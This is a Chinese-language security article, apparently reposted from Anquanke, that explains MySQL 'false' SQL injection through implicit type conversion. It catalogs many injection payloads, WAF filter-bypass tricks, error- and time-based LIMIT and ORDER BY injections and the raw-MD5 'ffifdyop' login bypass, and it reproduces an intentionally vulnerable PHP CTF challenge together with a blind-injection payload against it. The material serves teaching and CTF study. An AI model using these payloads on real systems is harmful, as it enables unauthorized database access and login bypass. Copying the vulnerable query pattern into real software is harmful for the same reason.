@@ -1,0 +1,407 @@
+# 【技术分享】MySQL False注入及技巧总结
+
+阅读量 **702905**
+
+|评论 **3**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-05-05 10:02:05
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：安全客
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+****
+
+作者：[ **Leej**](http://bobao.360.cn/member/contribute?uid=2783271953)
+
+**预估稿费：300RMB**
+
+投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
+
+**0x01 False Injection**
+
+**引子** **** ****
+
+首先我们常见的注入
+
+    
+    
+    1=1
+    0<1
+    ''=''
+
+这些都是基于1=1这样的值得比较的普通注入，下面来说说关于False注入，利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。
+
+首先抛出这么一个问题
+
+为什么username=0会导致返回数据呢？  
+
+这就是一个基于false注入的例子，下面在举一个例子
+
+和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于MYSQL的隐式类型转换。
+
+**MYSQL隐式类型转换**
+
+关于[ **官方文档**](https://dev.mysql.com/doc/refman/5.6/en/type-conversion.html)
+中是这么说的
+
+The following rules describe how conversion occurs for comparison operations:
+
+If one or both arguments are NULL, the result of the comparison is NULL,
+except for the NULL-safe
+[<=>](https://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#operator_equal-to) equality comparison operator. For NULL <=>
+NULL, the result is true. No conversion is needed.
+
+If both arguments in a comparison operation are strings, they are compared as
+strings.
+
+If both arguments are integers, they are compared as integers.
+
+Hexadecimal values are treated as binary strings if not compared to a number.
+
+If one of the arguments is a
+[TIMESTAMP](https://dev.mysql.com/doc/refman/5.5/en/datetime.html) or
+[DATETIME](https://dev.mysql.com/doc/refman/5.5/en/datetime.html) column and
+the other argument is a constant, the constant is converted to a timestamp
+before the comparison is performed. This is done to be more ODBC-friendly.
+Note that this is not done for the arguments to
+[IN()](https://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#function_in)! To be safe, always use complete datetime, date,
+or time strings when doing comparisons. For example, to achieve best results
+when using [BETWEEN](https://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#operator_between) with date or time values, use
+[CAST()](https://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#function_cast) to explicitly convert the values to the desired
+data type.
+
+If one of the arguments is a decimal value, comparison depends on the other
+argument. The arguments are compared as decimal values if the other argument
+is a decimal or integer value, or as floating-point values if the other
+argument is a floating-point value.
+
+In all other cases, the arguments are compared as floating-point (real)
+numbers.
+
+其中大致是：
+
+如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL<=>NULL 会返回1。不做类型转换
+
+两个参数都是字符串，按照字符串比较。不做类型转换
+
+两个参数都是整数，按照整数比较。不做类型转换
+
+如果不与数字进行比较，则将十六进制值视为二进制字符串。
+
+有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳
+
+有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal
+后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
+
+所有其他情况下，两个参数都会被转换为浮点数再进行比较
+
+最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败
+
+在这里我试了试如果是字符串和数字比较：
+
+可以看到在进行类型转换的时候，将字符串转换的时候会产生一个warning，转换的结果为0，但是如果字符串开头是数字的时候还是会从数字部分截断，转换为数字。
+
+现在可以很好理解开头说的为什么username=0会导致返回数据了，就是因为这里会将数据转换为浮点数比较，但是字符串转换会出问题，从而返回0使得0=0从而为true得到结果，而后面passwd查询少一组数据的原因就是admin的passwd字段第一个字符是2
+从而返回2 并非为0。
+
+**2、利用**
+
+实际中我们接触到的语句都是带有引号的，类似于where username='+input+'
+这样的，这时候我们就需要做一些处理来构造false注入的利用点。
+
+**2.1、算术运算**
+
+加：+
+
+    
+    
+    '+', 拼接的语句：where username=''+''
+
+减：-
+    
+    
+    '-' 拼接的语句：where username=''-''
+
+乘：*
+
+    
+    
+     '*' 拼接的语句：where username=''*''
+
+除：/
+
+    
+    
+     '/6# 拼接的语句：where username=''/6#
+
+取余：%
+
+    
+    
+     '%1# 拼接的语句：where username=''%1#
+
+**2.2、 位操作运算**
+
+我们可以使用当字符串和数字运算的时候类型转换的问题进行利用
+
+我们可以用的位运算符有：
+
+和运算：&
+
+    
+    
+     '&0# 拼接的语句：where username=''&0#'
+
+或运算：|
+
+    
+    
+     '|0# 拼接的语句：where username=''|0#'
+
+异或运算：^
+
+    
+    
+     '^0# 拼接的语句：where username=''^0#'
+
+移位操作：
+
+    
+    
+     '<<0# '>>0#
+
+位非（~）：这里位非运算符由于是在表达式之前的
+
+**2.3、 比较运算符**
+
+安全等于：<=>
+
+    
+    
+     '=0<=>1# 拼接的语句：where username=''=0<=>1#'
+
+不等于<>(!=)
+
+    
+    
+     '=0<>0# 拼接的语句：where username=''=0<>0#'
+
+大小于>或<
+
+    
+    
+     '>-1# 拼接的语句：where username=''>-1#
+
+**2.4、 其他**
+
+    
+    
+    '+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1
+
+**3、综合利用**
+
+false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。
+
+这里举例一道题
+
+    
+    
+     <?php  include("config.php");  $conn ->query("set names utf8");  function randStr($lenth=32){     $strBase = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";     $str = "";     while($lenth>0){       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);       $lenth --;     }    return $str; }  if($install){     $sql = "create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci ";     if($conn->query($sql)){        $sql  = "insert into `user`(`username`,`passwd`,`role`) values ('admin','".md5(randStr())."','admin')";        $conn -> query($sql);     } }  function filter($str){      $filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";      if(preg_match($filter,$str)){          die("you can't input this illegal char!");      }      return $str;  }   function show($username){   global $conn;   $sql = "select role from `user` where username ='".$username."'";   $res = $conn ->query($sql);   if($res->num_rows>0){        echo "$username is ".$res->fetch_assoc()['role'];   }else{       die("Don't have this user!");   } }  function login($username,$passwd){     global $conn;     global $flag;      $username = trim(strtolower($username));     $passwd = trim(strtolower($passwd));     if($username == 'admin'){         die("you can't login this as admin!");     }      $sql = "select * from `user` where username='".$conn->escape_string($username)."' and passwd='".$conn->escape_string($passwd)."'";     $res = $conn ->query($sql);     if($res->num_rows>0){         if($res->fetch_assoc()['role'] === 'admin') exit($flag);     }else{        echo "sorry,username or passwd error!";     }  }  function source(){      highlight_file(__FILE__); }  $username = isset($_POST['username'])?filter($_POST['username']):""; $passwd = isset($_POST['passwd'])?filter($_POST['passwd']):"";  $action = isset($_GET['action'])?filter($_GET['action']):"source";  switch($action){    case "source": source(); break ;    case "login" : login($username,$passwd);break;    case "show" : show($username);break; }
+
+我们注意到filter()函数
+
+    
+    
+    $filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
+
+这里看起来过滤的比较多，其中and，or还有&，|都被过滤了，这个时候就可以利用false进行盲注。
+
+可以在show函数利用查询的时候注入，
+
+    
+    
+    username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
+
+这里官方给出的就是利用异或，其实这里并不需要’admin‘只要是一串字符串就可以
+
+异或会使字符串都转为浮点型，都变为了0，由于0=0^0 -> 1^0 ->
+1当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如'+'、'^'、'/4#这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。
+
+**3.1、结合盲注**
+
+上面的例子payload就是利用字符串类型转换导致false注入结合盲注的一个过程
+
+  
+
+**0x02 一些注入的技巧**
+
+mysql中，我们用得到的：
+
+**常量：** true， false， null， N, current_timestamp变量：@myvar:=1
+
+**系统变量：** @@version, @@datadir….
+
+**常用函数：** version(), pi(), pow(), char(), substring()
+
+**字符串生成：** hex(), conv()
+
+**有关于字符串生成的一些基础字符：**
+true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6
+
+**1、过滤的绕过：**
+
+    
+    
+     空格：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  and，or：||，&&  union select：  利用括号，'and(true)like(false)union(select(pass)from(users))，  方括号union [all|distinct] select pass from users#，  union%a0select pass from users，  或者内联注释union/*&sort=*/select pass from users#  union：子查询进行盲注and length((select pass from users having substr(pass,1,1)='a'))  having：and(select substr(group_concat(pass),1,1)from users)='a  select ... from(过滤代码如/SELECTs+[A-Za-z.]+s+FROM/i/i)：  select [all|distinct] pass from users  select`table_name`from`information_schema` . `tables`  select pass as alias from users  select pass aliasalias from users  select pass`alias alias`from users  select+pass%a0from(users)  select,and,&：  这里就是可以利用上文中提到的false注入的方式进行绕过，具体见上文
+
+不使用逗号：' and substr(data from 1 for 1) = 'a'#
+
+**2、技巧**
+
+下面说几种不同情境的注入技巧
+
+**2.1、like**
+
+有时候我们可以利用一些逻辑语句进行注入例如在最近的0ctf上的Temmo’s Tiny
+Shop这个题中，我们在搜索的时候推测出语句是在like后的，就可以通过left来进行like盲注
+
+    
+    
+    if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)
+
+**2.2、Limt**
+
+在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO是需要写的权限。
+
+利用PROCEDURE 有两种方式，基于报错和时间的，具体文章见这里[
+**Mysql下Limit注入方法**](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)
+
+**基于报错：**
+
+    
+    
+    mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+
+**基于时间：**
+
+    
+    
+    SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
+
+**2.3、order by**
+
+order by 后的数字可以作为一个注入点。具体可以看这个文章[ **MySQL Order By
+注入总结**](https://www.secpulse.com/archives/57197.html)
+
+这里可以用一些判断和返回值进行利用，
+
+    
+    
+    /?order=IF(1=1,name,price) 通过name字段排序 /?order=IF(1=2,name,price) 通过price字段排序
+    
+    
+    /?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序 /?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序
+    
+    
+    /?order=IFNULL(NULL,price) 通过price字段排序 /?order=IFNULL(NULL,name) 通过name字段排序
+
+还可以用rand函数
+
+    
+    
+    /?order=rand(1=1) /?order=rand(1=2)
+
+通常这里我们是不知道列名的，那可以通过报错进行利用
+
+    
+    
+    /?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常 /?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误  利用regexp /?order=(select+1+regexp+if(1=1,1,0x00)) 正常 /?order=(select+1+regexp+if(1=2,1,0x00)) 错误  利用updatexml /?order=updatexml(1,if(1=1,1,user()),1) 正确 /?order=updatexml(1,if(1=2,1,user()),1) 错误  利用extractvalue /?order=extractvalue(1,if(1=1,1,user())) 正确 /?order=extractvalue(1,if(1=2,1,user())) 错误 利用sleep()也可以.... 方法比较灵活
+
+**3、有关函数**
+
+**3.1 不常用函数绕过滤**
+
+    
+    
+    lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi' rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??' left(data,1) reverse(right(reverse(data),1)) insert(insert(version(),1,0,space(0)),2,222,space(0))
+
+**3.2 搜索匹配类的函数**
+
+    
+    
+    '-if(locate('f',data),1,0)# '-if(locate('fo',data),1,0)# '-if(locate('foo',data),1,0)# instr(), position()
+
+**3.4、使用函数进行字符串的切割**
+
+    
+    
+    length(trim(leading 'a' FROM data)) # length will be shorter length(replace(data, 'a', '')) # length will be shorter
+
+**4 关于php中md5的一个小技巧**
+
+PHP中这么一段sql语句
+
+    
+    
+    $sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
+
+这里是可以注入绕过的，在php关于[ **MD5函数**](http://php.net/manual/en/function.md5.php) 的介绍说
+
+如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。
+
+也就是找到一个字符串MD5的二进制恰好和字符编码中的某些编码对上了，就可以产生注入，原文作者找到这么一串字符串ffifdyop,md5加密后对应字符编码刚好是'or'<trash>,便产生注入
+
+这里的[ **原文在这**](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
+
+**END**
+
+false注入也许在某些时候会利用，但是对其中并不是很了解，所以在这里进行了一下系统地总结。
+
+同时往往在利用的时候往往不只是一个点，要结合许多姿势。文章后半部分就是总结了一些注入小姿势，并不是很系统有些散，如果有错误欢迎大佬指出。
+
+**参考**
+
+<https://www.exploit-db.com/papers/18263/>
+
+<https://www.secpulse.com/archives/57197.html>
+
+<http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes>
+
+<https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html>
+
+本文翻译自安全客 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Leej** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/86021](/post/id/86021)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [安全客]()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __15赞
+
+ __收藏
+
+![](https://p2.ssl.qhmsg.com/dm/200_200_100/t01913128a30a69b0e2.jpg) Leej
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
